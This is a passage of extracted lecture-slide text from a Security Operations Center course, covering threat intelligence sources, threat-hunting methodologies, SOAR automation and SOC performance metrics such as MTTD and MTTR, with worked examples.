personnel make the best use of threat intelligence, threat intelligence platforms (TIP) have evolved.\nA threat intelligence platform centralizes the collection of threat data from numerous data sources and formats. There are three major types of threat intelligence data. The first is indicators of compromise (IOC). The second is tools, techniques, and procedures (TTP). The third is reputation information about internet destinations or domains. The volume of threat intelligence data can be overwhelming, so the threat intelligence platform is designed to aggregate the data in one place and--most importantly--present the data in a comprehensible and usable format.\nOrganizations can contribute to threat intelligence by sharing their intrusion data over the internet, typically through automation. Many threat intelligence services use subscriber data to enhance their products and to keep current with the constantly changing immerging threat landscape.\nHoneypots are simulated networks or servers that are designed to attract attackers. The attack-related information gathered from honeypots can then be shared with threat intelligence platform subscribers. However, hosting honeypots can itself be a risk. Basing a honeypot in the cloud isolates the honeypot from production networks. This approach is an attractive alternative for gathering threat intelligence.\nSources of Threat Intelligence data\nCISA (Cybersecurity and Infrastructure Security Agency): Provides updates on patches, malware analyses, and Known Exploited Vulnerabilities Catalogue. Targets American audience but valuable globally.\nDark Reading: Community forum for real-time threat information and knowledge-building. Offers insights from the dark web.\nSANS Internet Storm Center: Relies on unpaid volunteers to collect data on internet traffic for analysis. Offers free analysis and warning services to users and companies.\nRed Canary: Features \"Better Know a Data Source\" series and Monthly Intelligence Insights for detection opportunities.\nKrebson security: Excellent resource for senior executives new to cybersecurity. Written by an investigative journalist covering top news.\nMicrosoft: Offers current vulnerability and mitigation advice consistent with its scale.\nCrowdStrike: Covers latest news in the cybersecurity world.\nMandiant: Releases detailed technical analyses of malware and threat actors with tight attribution standards.\nCisco Talos: Provides high-quality evaluations with high update frequency. Offers accurate, timely, and actionable threat information.\n FBI (Internet Crime Complaint Center - IC3): Collaborates with CISA. Lacks native RSS feed but valuable for additional insights.\n\n5. Threat Intelligence and Threat Hunting \u000b\n \n5.3 Threat hunting methodologies and techniques \n \n\n\u000bWhat is threat hunting?\u000b\n\tThreat hunting, also known as cyberthreat hunting, is a proactive approach to identifying previously unknown, or ongoing non-remediated threats, within an organization's network. The primary goal of threat hunting is to discover potential incidents before they negatively impact your organization. \nThreat hunting Memory Analysis: Checking your system’s memory for malicious activity using memory dumps, which are snapshots of a device's random-access memory (RAM) at a specific point in time.\nServer Image Analysis: Analyzing server images for threat activity.\nEndpoint Protection Data: Checking endpoint protection data for signs of suspicious activity.\nDisk Image Analysis: Analyzing the disk images of individual workstations to see if anything raises a red flag.\nNetwork Protection Infrastructure: Checking your network protection infrastructure for alerts or anomalous data points that may indicate the presence of a threat, such as malware.\n\n\n\nCyber threat hunting \u000bMethods, Tools, Techniques & Frameworks\n \nWhat is Cyber Threat Hunting?\n\nIt is an active information security strategy used by a security analyst. Threat Hunting is a proactive method utilized by Security Analysts to identify unfamiliar or non-remediated cyber threats within an organization's network. \n\nIt involves iterative searches for indicators of compromise, including Advanced Persistent Threats (APTs) and Hacker tactics, techniques, and procedures (TTP) that can damage existing systems.\n \nCyber Threat Hunting Activities\n1. Hunting for insider threats or outside threats or attackers:\nCyber threat hunters can detect threats posed by insiders like employees and outsiders like criminal organizations.\n2. Actively looking for known adversaries:\nA known attacker is someone whose code pattern is on the deny list of known dangerous programs or who is identified in threat intelligence services.\n3. To find hidden risks and stop an assault from happening:\nThreat hunters constantly watch the computer environment and can identify irregularities that might point to a threat through behavioural analysis.\n4. Predict & Update Response Plan:\nThreat hunters evaluate a threat as thoroughly as they can before implementing the incident response strategy to counter it. This is used to update the response plan and prevent any similar attacks.\n\u000bEffective Threat hunting process\u000b\nCyber threat hunters employ this structured approach to gather intelligence on attackers' strategies and objectives. Additionally, they utilize obtained insights to understand an organization's security landscape, anticipate future threats, and address existing vulnerabilities.\nEffective Threat Search Process:\nTrigger: Advanced detection systems identify anomalous behavior indicating potential threats, prompting threat hunters to investigate further.\nExample: Security teams anticipate future threats by exploring emerging technologies like fileless malware, triggering proactive hunting efforts.\n\nInvestigation: Threat hunters utilize Endpoint Detection and Response (EDR) technologies to analyze system vulnerabilities and potential intrusions.\nExample: Investigations continue until the threat is confirmed harmless or until comprehensive data about the malicious activity is collected.\nResolution: Operations and security teams leverage data on malicious activities to respond to incidents promptly and mitigates effectively.\nExample: Insights gained from both malicious and benign activities enhance the efficiency of automated systems, reducing reliance on human intervention.\n\n\n\u000bEffective Threat hunting process\u000b\n5. Threat Intelligence and Threat Hunting \u000b\n \n5.4 Incorporating threat intelligence into incident response\n\u000b\u000bThreat hunting methodologies and techniques:\u000b\u000b\n1.Intelligence-based hunting:\n\tIntel-based threat hunting is a reactive threat-hunting model using IoCs from intelligence sources. The hunt follows predestined rules set by the SIEM and threat intelligence. Intel-based hunts can use IoCs, hash values, IP addresses, domain names, networks, or host artifacts provided by intelligence-sharing platforms such as Computer Emergency Response Team – CERT. These platforms allow for the export of automated alerts in the form of Trusted Automated Exchange of Intelligence Information (TAXII) and Structured Threat Information Expression (STIX), which can then be imported into SIEM. Once the SIEM has issued the warning based on an IoC, the threat hunter can look into the harmful activity that occurred before and after the alert to discover any environmental breach.\n2. Investigation using indicators of attack:\n\tInvestigation using Indicators of Attack (IOAs) is a proactive threat hunting method, aiming to detect APT groups and attacks through global detection playbooks. It's commonly utilized with threat frameworks like MITRE (Massachusetts Institute of Technology Research and Engineering\".) ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge). \nThe process involves:\nUtilizing TTPs(Tactics, Techniques and Procedures) and IOAs to pinpoint threat actors.\nMonitoring activities to identify patterns and isolate threats.\nEvaluating the environment, domain, and attack behaviors to build hypotheses aligned with MITRE.\n\n\u000bThreat hunting methodologies and techniques:\u000b\n3. Hypotheses-based hunting :\nHypothesis-based threat hunting is a proactive threat-hunting model that uses a threat-hunting library It’s aligned with the MITRE ATT&CK framework and uses the global detection playbooks to identify APT groups and malware attacks. Hypothesis-based hunts use IoAs and TTP of attackers. \nDepending on the environment, domain, and threat behavior patterns utilized to form a hypothesis in line with the MITRE ATT&CK paradigm, the hunter determines the threat actors. Once the behaviour pattern is identified, the hunter monitors the activity patterns to detect, identify and isolate the threat. \nAs such, the hunter can proactively detect the threat actors before they can damage the environment.\nAnalytics-driven: Hypotheses developed from structured frameworks and machine learning/AI data.\nSituational-awareness: Utilizes existing information and environment awareness to detect potential threats.\nIntelligence-driven: Hypotheses formed from threat actor tactics, techniques, and procedures (TTP). Testing involves observing system and network behaviors for TTP presence. Indicators of compromise (IoCs) or indicators of attack (IoAs) support intelligence-based hypotheses.\n4. Hybrid Hunting :\nCustom threat hunting is based on situational awareness and industry-based hunting methodologies. It detects anomalies in SIEM and EDR tools and may be tailored to meet the needs of the customer. They are proactively executed based on situations, such as geographical issues and targeted attacks. Both Intel and hypothesis-based hunting models employing IoA and IoC information can be used in these hunting operations.\nCustomization: Security analysts combine various hunting methodologies, including industry-based, situational awareness, and specific requirements.\nIntegration: Incorporates data from geopolitical situations to tailor the hunt accordingly.\nAutomation: Due to vast data, machine learning techniques and threat intelligence are utilized to automate a significant portion of the process.\n\n\n\u000b\u000b\u000bThreat Hunting Tools\u000b\u000b\u000b\nTo identify suspicious behaviors, Threat Hunters employ solutions and technologies. The following are the primary categories of threat hunting tools:\nNetwork security monitoring tools: Antivirus, firewalls, and endpoint security solutions collect and monitor network security data.\nSIEM solutions: Security information and event management (SIEM) solutions assist in handling raw security data and real-time threat analysis.\nAnalytics tools: Statistical and intelligence analysis software generates a visual report using interactive graphs and charts, making it easier to connect dots and spot patterns.\n\n\nThreat Hunting Frameworks\nThere is a no. of threat-hunting frameworks which organizations can employ. Two of the most popular are:\nTaHiTI – Targeted Hunting integrating Threat Intelligence framework\nThis framework is aligned with intel-based hunting. Threat intelligence, past occurrences, red teaming efforts, and other sources are sources of triggers.\n2. MITRE PRE-ATT&CK and ATT&CK frameworks\nThese frameworks offer the expertise that may be used to address certain threat models and adversarial tactics.\nAn effective defence against threat actors is provided by a threat-hunting team's use of combinations of these techniques and resources as necessary.\nThreat Hunting Process:\nThe actual threat hunt process starts from Step 3 in the given figure. Pre-hunt activities are integrated into our approach.\nThe threat-hunting is a cyclic process by nature. It consists of four processes.\nCreation of a hypothesis.\nVerifying and validating the hypothesis. This process also includes further investigation for any proof with the help of Tools and Techniques.\nUncover new TTP and patterns.\nInform and Enrichment. It is informing the incident response team about new TTP's which updates new threat definitions and categorizes threats using YARA and STIX.\n\n\u000b\u000bWhat is Difference between Threat hunting vs Threat Intelligence?\u000b\n\t\n\nThreat Hunting using Yara\n\n\nhttps://www.geeksforgeeks.org/threat-hunting-using-yara/\nhttps://support.phishingtackle.com/hc/en-gb/articles/4410170814609-YARA-Rule-Examples\nExample 1 - Detect messages with a demand for money \nExample 2 - Prevent specific website links or names\nExample 3 - Hexadecimal strings for file signatures\nExample 4 - Using Regular expression to detect URLs\nExample 5 - Using multiple conditions to improve matches\n\nActivity - ATT&CK Navigator\nThe ATT&CK Navigator is a web-based tool for annotating and exploring ATT&CK matrices. It can be used to visualize defensive coverage, red/blue team planning, the frequency of detected techniques, and more.\u000b\nhttps://www.youtube.com/watch?v=78RIsFqo9pM\u000b\nATT&CK® Navigator (mitre-attack.github.io)\nExample Flows — Attack Flow v2.1.7 documentation (center-for-threat-informed-defense.github.io)\n\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Lecture 6  Automation and Orchestration (SOAR)-updated-sundar.pptx": "Lecture 6:\nAutomation and Orchestration\nObjectives\nWhat is SOAR ?\u000bSecurity Orchestration, Automation, and Response\nIt’s a cybersecurity approach that uses automation and coordination to quickly and effectively respond to and manage security incidents.\nSOAR is a stack of compatible software programs that enables an organization to collect data about cybersecurity threats and respond to security events with little or no human assistance. \nThe goal of using a SOAR platform is to improve the efficiency of physical and digital security operations.\nAspects of SOAR\nSecurity Orchestration:\nThis encompasses arranging and ordering different security tasks across diverse tools and technologies. For instance, when a security issue arises, SOAR can automatically initiate a series of predefined actions across various security systems.\nAutomation:\nSOAR systems streamline routine and repetitive tasks that security teams would otherwise need to carry out manually. This covers activities such as collecting data, confirming incidents, and executing response measures.\nResponse:\nSOAR simplifies incident management by furnishing playbooks or workflows that direct security analysts through the necessary steps for examining and alleviating threats. These playbooks can be tailored to suit an organization’s specific requirements.\n\nSOAR Capabilities\nWorkflow Orchestration: SOAR arranges and sequences tasks across different security tools, ensuring that actions happen logically and in a coordinated manner when responding to incidents.\nAutomating Routine Activities: SOAR automates repetitive and manual tasks, like collecting data, validating information, and executing responses. This lets human analysts focus on more strategic tasks.\nIncident Playbooks: SOAR provides both ready-made and adaptable playbooks that direct security analysts through step-by-step procedures for various incident types. This guarantees consistent and efficient responses.\nIntegration with Security Tools: SOAR smoothly blends with an array of security tools and systems, allowing seamless communication and information exchange among various components.\nThreat Intelligence Incorporation: SOAR can combine external threat intelligence feeds, enhancing incident data with real-time insights into emerging threats and vulnerabilities.\nAnalyzing and Reporting: Through data analytics, SOAR supplies insights that help organizations grasp patterns in incidents, assess response effectiveness, and understand their overall cybersecurity status, aiding well-informed decisions.\nElements of SOAR\nSOAR is a set of security features that helps organizations collaborate on incident investigation and automate certain actions that SOC analysts perform. \nAs the end goal with SOAR, we want to achieve a faster mean time to acknowledge (MTTA) and mean time to respond (MTTR). The MTTA and MTTR are the two most important measurements for a SOC.\nThe main elements of SOAR are as follows:\nIncident management\nInvestigation\nAutomation\nReporting\nTI and Threat and Vulnerability Management (TVM)\n\nSecurity Orchestration Terminology \nSecurity Orchestration Terminology  \nWhile learning about security orchestration, keep in mind the following terms:\nSecurity automation: Security automation is the process of executing security tasks using machines instead of humans.\nPlaybooks: Playbooks, also called runbooks, are task-based graphical workflows that help visualize processes across security products. These playbooks can be fully automated, fully manual, or anywhere in between.\nHow to create an incident response playbook: https://www.techtarget.com/searchsecurity/tip/How-to-create-an-incident-response-playbook\nIntegrations: Product integrations or apps are mechanisms through which security orchestration platforms communicate with other products. These integrations can be executed through Representational State Transfer (REST) APIs, webhooks, and other techniques. An integration can be unidirectional or bidirectional. Bidirectional integrations allow both products to execute crossconsole actions.\nIngestion: Ingestion is a name given to the process through which security orchestration tools consume alerts from other security products.\nSOAR Security Components\n6.2 Implementing automation in SOC workflows.\n6.2 Implementing automation in SOC workflows.\n\n SOAR Workflows (E.g: Phishing Workflow)\nScenario: THM Corp employees have recently received numerous suspicious emails and have reported them to the SOC team for investigation. As the lead analyst, you wish to develop an automated workflow to analyse email files and perform case management using various security tools.\nPhishing attacks remain the most common attack vector used in breaches. Unfortunately for security analysts, investigating phishing emails becomes time-consuming and involves manual exercises such as analysing attachments and URLs. \nSOAR solutions can execute these tasks in the background while other investigations are ongoing. Additionally, remediation can be performed when a positive phishing email is identified.\nNow, what would this workflow look like? Let’s build a flow of events using our scenario as a security analyst assigned to the incident.\nPhishing Workflow\n6.3 Benefits and challenges of orchestration\n\n6.3 Benefits and challenges of orchestration\nAutomating one task may impress one team by expediting a particular task. \nAn example might be automating a task to assign a port with encapsulation VLAN on an ACI leaf so that virtual machine (VM) traffic can be initiated; this task automation might get you some applause from a small group of individuals, but it will not make a perceivable difference in the overall rapid application development process. When automation is built into a series of processes and workflows, which are then orchestrated to run automatically, there can be endless benefits.\nSome of the commonly observed benefits of automation and orchestration include the following:\nRapid and consistent changes, Simplicity, \nReducing human error, Making changes on the fly\nService catalog offerings for end users, Quick recovery after disaster,Cost reduction\nWhat are the benefits of SOAR Platform?\n Faster incident detection and reaction times. The volume and velocity of security threats and events are constantly increasing. SOAR's improved data context, combined with automation, can lower mean time to detect, or MTTD, and speed up mean time to respond, or MTTR. By detecting and responding to threats more quickly -- through automated playbooks, when available -- their effects can be lessened.\nBetter threat context. By integrating more data from a wider array of tools and systems, SOAR platforms can offer more context, better analysis and up-to-date threat information.\nSimplified management. SOAR platforms consolidate various security systems' dashboards into a single interface. This helps SecOps and other teams by centralizing information and data handling, simplifying management and saving time.\nScalability. Scaling time-consuming manual tasks can be a drain on employees and even impossible to keep up with as security event volume grows. The orchestration, automation and workflows can meet scalability demands more easily.\nBoosted analyst productivity. Automating lower-level threats augments SecOps and security operations center (SOC) teams' responsibilities, enabling them to prioritize tasks more effectively and respond to threats that require human intervention more quickly.\nStreamlined operations. Standardized procedures and playbooks that automate lower-level tasks enable SecOps teams to respond to more threats in the same time period. These automated workflows also ensure the same standardized remediation efforts are applied organization-wide across all systems.\nReporting and collaboration. SOAR platforms' reporting and analysis consolidate information quickly, enabling better data management processes and better response efforts to update existing security policies and programs for more effective security. A SOAR platform's centralized dashboard can also improve information sharing across disparate enterprise teams, enhancing communication and collaboration.\nLowered costs. In many instances, augmenting security analysts with SOAR tools can lower costs, as opposed to manually performing all threat analysis, detection and response workflows.\n\nWhat are the challenges of SOAR?\nSOAR is not a silver-bullet technology, nor is it a standalone system. SOAR platforms should be part of a defense-in-depth security strategy, especially as they require the input of other security systems to successfully detect threats.\nSOAR is a complementary technology, not a substitution for other security tools. SOAR platforms are not a replacement for human analysts, but instead can augment their skills and workflows for more effective incident detection and response.\nOther potential drawbacks of SOAR include the following:\nFailure to remediate a broader security strategy.\nConflated expectations.\nIntegration complexities.\nDeployment and management complexity.\nLack of or limited metrics.\n\nDifficulties in SOAR\nThe primary difficulties in Security Orchestration, Automation, and Response (SOAR) include:\nComplex Integration Issue: Incorporating SOAR with current security tools and systems can be intricate and time-intensive. Ensuring seamless collaboration among all components and the smooth flow of data poses a considerable challenge.\nChallenge of Customization and Workflow Design: Developing and tailoring workflows and playbooks to align with an organization’s specific security procedures and requirements can be demanding. It necessitates expertise in both security operations and automation.\nSkill Gap and Training Dilemma: Efficiently utilizing SOAR demands skilled personnel who grasp cybersecurity practices and the technical intricacies of the SOAR platform. Training existing staff or finding qualified individuals can be problematic.\nOptimizing Alerts and Workflows: Overcoming alert overload and fine-tuning automated workflows and playbooks to minimize instances of incorrect alerts is a persistent challenge that mandates constant monitoring and adjustment.\n\nSOAR vs SIEM\u000b\n6.4 Use cases for SOC automation\nGiven the value of digitized business assets and the widening topology of IT infrastructure and big data, organizations face a pressing question: How should they respond to the increasing volume and variety of threats?\nMany companies are starting to automate foundational security operations center (SOC) tasks. \nAutomation helps increase the speed and agility of identifying and remediating threats, while simultaneously reducing the amount of human time and effort required to accomplish these tasks. \nSOAR is a class of technologies designed to automate these types of security workflows. SOAR encompasses the following functions in a SOC context:\nSecurity orchestration connects and coordinates with multiple heterogeneous tool sets -- both internal and external to the organization -- in the SOC for more efficient threat ingestion, enrichment, monitoring and incident identification.\nAutomation helps SOCs take a more proactive security stance by automatically triggering workflows, tasks and alert triages based on predefined parameters.\nResponse accelerates general and targeted SOC reactions to lower-risk incidents and supports analyst retort by enabling a single view to access, query and share threat intelligence.\n1. Threat intelligence coordination\nEach day, SOAR platforms ingest hundreds of thousands of indicators of compromise (IOCs). \nIOCs are collected from internal and external threat intelligence feeds, malware analysis tools, endpoint detection and response platforms, SIEM systems, network detection and response tools, email inboxes, RSS feeds, regulatory bodies and other databases. \nSOAR platforms can coordinate, aggregate and surface alerts from those tools, as well as detect suspicious IOCs that emerge across them.Each day, SOAR platforms ingest hundreds of thousands of indicators of compromise (IOCs). \nIOCs are collected from internal and external threat intelligence feeds, malware analysis tools, endpoint detection and response platforms, SIEM systems, network detection and response tools, email inboxes, RSS feeds, regulatory bodies and other databases. \nSOAR platforms can coordinate, aggregate and surface alerts from those tools, as well as detect suspicious IOCs that emerge across them.\n2. Case management\nPotential security threats can be detected by multiple tools. Thus, it can consume precious amounts of time for analysts to parse through disparate data associated with the same threat. SOAR in the SOC collates all the data toward a single story consisting of multiple correlated events. This enables case managers to identify the most important threats so they can be handled rapidly, which accelerates overall mean times to detect and respond, whether through automation or human intervention and analysis.\n4. Automated enrichment for remediation\nIn the past, SOC analysts relied on manual management and inventory of security vulnerabilities. \nBut by implementing SOAR, several SOC tasks can be automated to handle volume, monitoring and simple responses. \nSpecifically, SOAR correlates data on threats across multiple security tools to calculate risk and prioritize the threat accordingly.\n\n3. Vulnerability management\nSOAR platforms accelerate the IOC enrichment process by tapping multiple enrichment databases or querying different threat intelligence tools for context. \nThis enables SOC analysts to more accurately and efficiently parse, verify, triage and respond. \nThis SOAR use case saves analysts significant time by more rapidly enriching huge volumes of IPs, URLs and hashes to check for malice -- without compromising on the depth of inquiry needed.\n5. Threat hunting\nBeyond ingestion and enrichment, SOAR platforms' detection of IOCs effectively serves as a form of proactive threat hunting. Threat hunting is a crucial task for human analysts -- but a time-consuming one, given the widening scope of threats. SOAR helps with tedium and scale by adding data sets for continual analysis. Additionally, SOAR assists with the threat hunting scope by probing for malware or suspicious domains and incorporating human-in-the-loop decisioning at strategic points.\n6. Incident response\nAutomating incident remediation and response processes is intended to target threats upstream to prevent downstream costs. SOAR in the SOC handles remediation and response for several common security threats, such as phishing, malware, DoS, web defacement and ransomware.\n\nAutomated responses take myriad forms depending on the nature of the threat\nAuto-adding indicators to watchlists.\nAuto-blocking malicious indicators.\nAuto-quarantining indicators or compromised endpoints.\nAuto-patching of infrastructure hardware/software.\nAuto-generating tickets.\nAuto-blocking a suspicious email or IP address.\nAuto-deleting suspicious emails from other mailboxes.\nAuto-terminating user accounts.\nAuto-triggering an antivirus scan or security compliance check.\nAuto-alerting specific analysts, employees, vendors, partners or customers.\n\nSOAR Use Cases\u000bThe table that follows offers examples of common use cases for SOAR\nLab Activity: SOAR tools\nThe tools that will be covered are as follows:\n\nMicrosoft Sentinel SOAR\nSplunk SOAR (Phantom)\nGoogle Chronicle SOAR (Siemplify)\nSOAR Tools and Automation Hands-On Examples\nhttps://learning.oreilly.com/library/view/security-orchestration-automation/9781803242910/B18028_TOC_ePub.xhtml\nSOAR Hello World: https://www.youtube.com/watch?v=Boe1GiD6bfs\n\nClass Activities \nQuestion 1:\u000bThe act of connecting and integrating security tools and systems into seamless workflows is known as?\n Answer 1: Security Orchestration\n\nQuestion 2: What do we call a predefined list of actions to handle an incident?\nAnswer 2: Playbooks\n\nInvestigating cases and alerts using Chronicle SOAR\nInvestigating cases and alerts using Chronicle SOAR\nhttps://cloud.google.com/chronicle/docs/soar/overview-and-introduction/soar-overview\n\nWorking with cases\nWorking with alerts\nIncident response exercise scenarios\nHow to build an incident response plan, with examples, template?\n\nhttps://www.techtarget.com/searchsecurity/feature/5-critical-steps-to-creating-an-effective-incident-response-plan\n\nQuick Dig into SOAR Tools: https://learning.oreilly.com/library/view/security-orchestration-automation/9781803242910/B18028_04.xhtml#_idParaDest-59\n\nHow to build an incident response plan, with examples, template https://www.techtarget.com/searchsecurity/feature/5-critical-steps-to-creating-an-effective-incident-response-plan\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Lecture 7  Metrics, Reporting, and Continuous Improvement  Updated.pptx": "Lecture 7:\nMetrics, Reporting, and Continuous Improvement \n\nObjectives\nAfter studying this chapter, you should be able to understand\n7. Metrics, Reporting, and Continuous Improvement \n7.1 Key performance indicators (KPIs) for measuring SOC effectiveness \n7.2 Generating incident reports and post-incident analysis. \n7.3 Importance of lessons learned and continuous improvement \n7.4 SOC's role in compliance and regulatory requirements \n\n7.1 SOC Metrics: \u000bSecurity Metrics & KPIs for Measuring SOC Success\nThe Security Operations Center (SOC) is the central unit that manages the overall security posture of any organization. Knowing how your SOC is performing is crucial, so security teams can measure the strength of their operations.\nThe Security Operations Center (SOC, pronounced “sock”) is a vital component of an organization. It is responsible for:\nMonitoring systems, networks and data for any threats.\nResponding to security incidents.\nThe main goal of SOC is to maintain the overall cybersecurity posture of an organization by implementing effective security controls and policies.\nSOC metrics and KPIs are the measurable indicators that assist SOC in measuring the performance, effectiveness and efficiency of its security operations. There is a set of commonly used metrics across many organizations. \nOrganizations can choose these metrics based on factors such as:\nOrganizational goals\nIndustry- The maturity of their security programs\nCommon SOC metrics\u000b\nCurrently, many SOC teams worldwide utilize several commonly used incident response metrics. \nLet’s learn what these metrics are, their importance, and the ways to enhance them.\n\n\n \nSOC KPIs (Key Performance Indicators) are metrics used to measure the success of a particular aspect of an organization's Security operations. In a Security Operations Center (SOC), a CISO can use the following KPIs to monitor and measure the effectiveness of their security program:\nThreat Detection and Response Time: measures the time taken to detect and respond to security threats.\nFalse Positive and False Negative Rates: measures the accuracy of threat detection systems.\nMean Time to Attend and Analyse (MTTA&A): measures the time taken to attend and Analyse the security Alert.\nMean Time to Resolution (MTTR): measures the time taken to resolve security incidents.\nIncident Response Efficiency: measures the efficiency of the incident response process.\nSecurity Incidents Trends: tracks the number and type of security incidents over time.\nCompliance and Audit Metrics: measures the compliance with industry and organisational security standards.\nVulnerability Management Metrics: measures the effectiveness of the vulnerability management process.\nUser Awareness and Training Metrics: measures the effectiveness of security awareness and training programs.\nSecurity Spend and Resource Utilisation Metrics: measures the cost-effectiveness of security operations.\nThese KPIs can be displayed on a dashboard that provides a consolidated view of the SOC's performance, allowing the CISO to quickly identify areas for improvement and allocate resources accordingly.\n\n\n\n\nMean Time to Detect (MTTD)\nMTTD measures the average time a SOC team takes to detect an incident or a security breach. \nA shorter Mean Time to Detect (MTTD) value indicates better performance. \nMTTD = total time between failure & detection / No. of failures\nIt showcases the ability of the SOC team to quickly detect and respond to incidents, minimizing the impact on clients.\nAdditionally, MTTD it helps evaluate the effectiveness of monitoring tools and the efficiency of detection capabilities.\n\nMean Time to Resolution (MTTR)\nMTTR is the metric used to evaluate the average time a SOC team takes to completely resolve an incident once it has been detected. A lower MTTR value indicates that their incident response process is fast and highly effective. Typically, MTTR includes the time it takes to:\nInvestigate the root cause.\nApply fixes.\nCarry out recovery processes.\nThis metric allows organizations to identify areas where they need to focus, improving their incident response strategy.\n\nAssume there were 6 failures in a system, and the maintenance required to restore the system to full functionality took 3 hours, which is 180 minutes. \nSo, the MTTR would be, MTTR=180 / 6= 30 mins\nThis means that an organization’s MTTR is 30 minutes, which is the time on average the organization spends on each downtime\nMean Time Between Failures [MTBF]\nMean time between failures (MTBF) is the average time passed between a repairable failure of a hardware and the next time it occurs. MTBF gauges availability and reliability, so the higher the number of MTBF, the more reliable the system.\nMTBF is a metric that aims to help customers make informed decisions about when to upgrade a system or put hardware into maintenance.\nIf, after a preventive maintenance phase, the MTBF has improved, this suggests an improvement in the reliability of the hardware. The rise in MTBF also demonstrates the efficiency of the maintenance processes.\nMTBF is the time passed between one failure to the next.  Suppose a system functions perfectly for 13 hours. During this period, 3 failures occurred, which caused a total downtime of 1 hour. \n\nSo, the MTBF would be, \nMTBF = (13-1) / 3 = 4 hours\n\nThis figure means that a failure in the system occurs every 4 hours, causing the system to be down and generating losses for the organization. \n\nTracking this metric can help plan strategies that can reduce this downtime. Since MTBF is used to track reliability, it only reflects unexpected outages and does not consider any probable downtime during planned maintenance.\nMean Time to Attend and Analyze (MTTA&A)\nMTTA measures the average time taken by SOC teams to respond to and analyze an incident. \nIt starts with detecting an incident and ends when the team acknowledges and properly analyzes its priority, impact and possible resolution. \nTherefore, this metric helps you evaluate the efficiency and effectiveness of their incident response processes.\nThis metric is crucial as it reflects the efficiency and effectiveness of the incident response process. \nMTTA is a valuable measure to monitor responsiveness. If a team is taking too long to respond and suffers from alert fatigue, this metric will help highlight the issue\nLet’s say 5 incidents happened in an organization, and it took a total of 30 minutes between alert and acknowledgment for all the incidents; then the MTTA would be\nMTTA= 30 / 5 = 6 minutes\n\nThis means that the MTTA for the organization is 6 minutes, and the organization should work on reducing this time to optimize its resolution process.\nMean Time to Failure (MTTF)\nMean time to failure (MTTF) is the average time passed between non-repairable hardware failures. \nMTTF measures the reliability of non-repairable systems and signifies the extent of time that the system is expected to function before it fails completely.\nMTTF is an important metric used to measure the lifespan of replaceable or non-repairable hardware like keyboards, batteries, desk telephones, mice, etc.\nHistorical data on the MTTF of each kind of hardware allows IT technicians to plan obsolescence in a phased manner.\nSince the metric is used to identify how long a system would usually last, seeing whether a new version is outdoing the old would also help understand expected lifetimes and when to plan system check-ups.\n\nMTTF is the primary indicator of non-repairable hardware’s reliability, so the intention is to amplify the asset lifetime. Shorter MTTF leads to frequent downtime and disruptions. To calculate MTTF, use the below formula,\nMTTF=total hours of operation / total number of failures\n\nAssuming we were to examine three identical systems until all of them failed. The first system lasted 14 hours, the second one lasted 16 hours, and the third lasted 12 hours. MTTF, in this instance, would be,\nMTTF= (14 + 16 + 12) / 3 = 14 hours.\n\nThis means that this system, on average, would need to be replaced every 14 hours to prevent longer downtimes and subsequent damages.\nNumber of Security Incidents\nThis metric measures the number of security incidents detected and reported within a specific timeframe. \nIt helps organizations get insights into patterns or trends in security incidents.\nFor instance, if there is an increasing trend for several incidents, it may indicate that the organization needs improvements to its existing security controls. \nAdditionally, tracking the number of security incidents allows organizations to easily identify which types occur more frequently and require attention to prioritize them.\nFalse Positive Rates (FPR) and False Negative Rates (FNR)\nFPR, or False positive rate, measures the percentage of incidents that are incorrectly classified as cybersecurity incidents but are not actual threats. \nA high false-positive rate indicates that the system is more likely to generate false alarms.\nFalse negative rate (FNR) is the percentage of incidents that are mistakenly categorized as non-cyber threats but are actually cyber threats. \nA high false-negative rate indicates that the system is highly likely to miss the real security threats.\n\nCost of an Incident\nThis metric allows organizations to measure the direct and indirect costs of an incident:\nDirect costs include expenses such as the time and resources required for detection and response and legal fees.\nIndirect costs include the loss of revenue due to customer turnover, regulatory penalties, reputational damage, etc. \nAdditionally, there may be other expenses, such as costs associated with software updates and measures to prevent future incidents.\n\nMean Time to Detect (MTTD)\nOne company noticed their Mean Time To Deliver has increased over the past month and after investigating why, identified that its security monitoring tools weren’t optimized to respond to real threats in today’s threat landscape. \nThey decided to update security patches and configure them in order to detect newer threats more effectively, which reduced its MTTD.\nMean Time to Respond (MTTR)\nAn organization observes a noticeable increase in its MTTR. After conducting further investigation, they identify that their incident response process is too complex and time-consuming to meet today’s business demands. \nThey simplify it while offering additional training sessions to their incident response team members thereby decreasing MTTR significantly.\nReal-World Examples of a SOC \nPerformance with Common SOC Metrics\nReal-World Examples of a SOC Performance with Common SOC Metrics\nIncident Volume\nA company notices an unexpected spike in incident volume. They analyze root cause of these incidents and discover most are related to phishing attempts;\n accordingly, they take additional, security awareness measures such as training users or email filtering to reduce risks from these types of attacks. This can be extracted from a SIEM tool used for detection and response.\nFalse Positive Rate\nA SOC security team discovers its false positive rate is significantly higher than the industry norm. They conduct an assessment, realizing their threat intelligence tooling was outdated, causing unnecessary alarms. \nThey then update their system to cut down on false positives.\nIncident Escalation Rate\nIn a medium-sized enterprise, SOC finds that a significant number of incidents are escalated to higher-level personnel. Analyzing the data, they realize their on-the-ground personnel require more training to handle complex issues, and \nsubsequently, conduct more in-depth training sessions.\n\n7.2 Generating incident reports and post-incident analysis\nWHAT IS A POST-INCIDENT REVIEW?\nA post-incident review is a detailed retrospective that allows you to comprehensively examine a cybersecurity event, such as a data breach, leak, cyberattack, and so on. It involves closely analyzing each part of an incident from beginning to end to gather insights and strengthen cyber resilience.\nBroadly speaking, the goals of post-incident review are threefold:\nFind the root cause: Reviews help you identify where incidents began so you can prevent them from happening again in the future.\nScope the damage: They also intend to assess your response holistically, helping you minimize impacts and recover more effectively.\nMake improvements: Most importantly, post-incident activities aim to mature your cybersecurity posture and close gaps in your defenses.\nA post-incident analysis report (PIAR) is a document that summarizes the key information and lessons learned from a cybersecurity incident. It helps you improve your security posture, identify root causes, and prevent future breaches. Writing a PIAR can be challenging, but it is an essential part of the incident response process. \nAfter a security incident has been identified, contained, eradicated, and recovered from, the final step is to conduct a post-incident analysis and reporting. \nI. Post-Incident Analysis\nA. Incident Timeline Creation involves creating a timeline of events that occurred during the security incident.\nB. Root Cause Analysis involves identifying the root cause of the security incident.\nC. Impact Analysis involves identifying the impact of the security incident on the organization.\nD. Lessons learned involves identifying any areas for improvement in the incident response process.\nII. Reporting\nA. The executive summary provides an overview of the incident and its impact on the organization.\nB. The incident details section provides detailed information about 